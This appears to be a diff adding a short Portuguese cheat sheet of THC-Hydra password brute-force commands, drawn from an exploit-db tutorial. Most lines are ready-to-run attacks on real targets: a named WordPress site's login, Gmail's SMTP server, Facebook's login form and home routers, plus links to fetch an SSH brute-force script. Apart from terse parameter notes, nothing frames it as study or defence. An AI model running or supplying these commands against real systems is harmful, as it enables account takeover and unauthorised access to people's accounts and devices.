@@ -1,0 +1,30 @@
+cat /usr/share/exploitdb-papers/papers/portuguese/13672-[portuguese]-tutorial-thc-hydra.txt (parrot)
+
+Metodo: post
+Usuario: email
+Senha: pass
+Acessar: Entrar
+Mensagem de Erro: ERRO
+
+^
+
+hydra -L pw.txt -P pw.txt cursoformuladaimportacao.com http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&LogMeIn=redirect_to:ERROR" -vV
+
+hydra -S -l email -P lista.txt -v -V -e ns -s 465 smtp.gmail.com smtp
+
+hydra -l email -P lista.txt -e ns https://enderecodosite:8080 ou 443 ou ainda 80
+
+hydra -l root -P test.txt -e ns -s 80 192.168.1.254 http-get -Vv
+
+
+hydra -l email -P lista.txt www.facebook.com https-post-form "/login.php:email=^USER^&pass=^PASS^&Entrar=lsd"
+
+para roteadores tentar 
+
+hydra -l user -P wordlist.txt ip http-get -Vv
+
+git clone https://github.com/cr1pt0n/brute-ssh.git
+
+wget https://github.com/cr1pt0n/brute-ssh.git
+
+script para brute em ssh nesses links ai
